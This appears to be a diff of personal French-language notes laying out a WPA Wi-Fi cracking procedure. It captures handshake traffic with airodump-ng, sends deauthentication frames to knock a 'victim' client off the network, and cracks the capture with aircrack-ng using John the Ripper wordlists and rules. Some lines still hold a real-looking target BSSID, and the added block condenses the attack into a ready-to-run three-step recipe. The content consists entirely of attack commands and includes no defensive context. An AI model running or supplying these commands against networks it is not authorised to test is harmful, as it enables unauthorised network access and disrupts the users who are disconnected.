@@ -10,12 +10,25 @@ $ sudo aireplay-ng --deauth 5 -a <MAC BSSID> -c <MAX VICTIME> wlan0mon
 $ sudo sudo aircrack-ng ~/wpa-01.cap -w /usr/share/john/password.lst
 
 4- Aide de John
-$ sudo john --stdout -w=/usr/share/john/password.lst | aircrack-ng -b EC:BE:DD:7C:A7:A0 ~/wpa-01.cap -w -
+$ sudo john --stdout -w=/usr/share/john/password.lst | aircrack-ng -b <MAC BSSID> wpa-01.cap -w -
 
 5-Aide de John avec dico francais (packetstormsecurity.com, recherche french.gz)
 $ sudo john --stdout -w=/usr/share/john/french.lst | aircrack-ng -b EC:BE:DD:7C:A7:A0 ~/wpa-01.cap -w -
 
 6- Aide avec rules
-$ sudo john --stdout -w=/usr/share/john/french.lst --rules | aircrack-ng -b EC:BE:DD:7C:A7:A0 ~/wpa-01.cap -w -
+$ sudo john --stdout -w=/usr/share/john/french.lst --rules | aircrack-ng -b <MAC BSSID> wpa-01.cap -w -
 
->@######################################################################
+>@
+>@######################################################################################################
+>@
+>@* Enregistrement trafic
+>@$ airodump-ng --bssid <MAC BSSID> --channel 1 -w wpa wlan0mon
+>@ 
+>@* Deauth
+>@$ sudo aireplay-ng --deauth 5 -a <MAC BSSID> -c <MAX VICTIME> wlan0mon
+>@
+>@* Crack
+>@$ sudo john --stdout -w=/usr/share/john/french.lst | aircrack-ng -b <MAC BSSID> wpa-01.cap -w -
+>@
+>@######################################################################################################
+>@
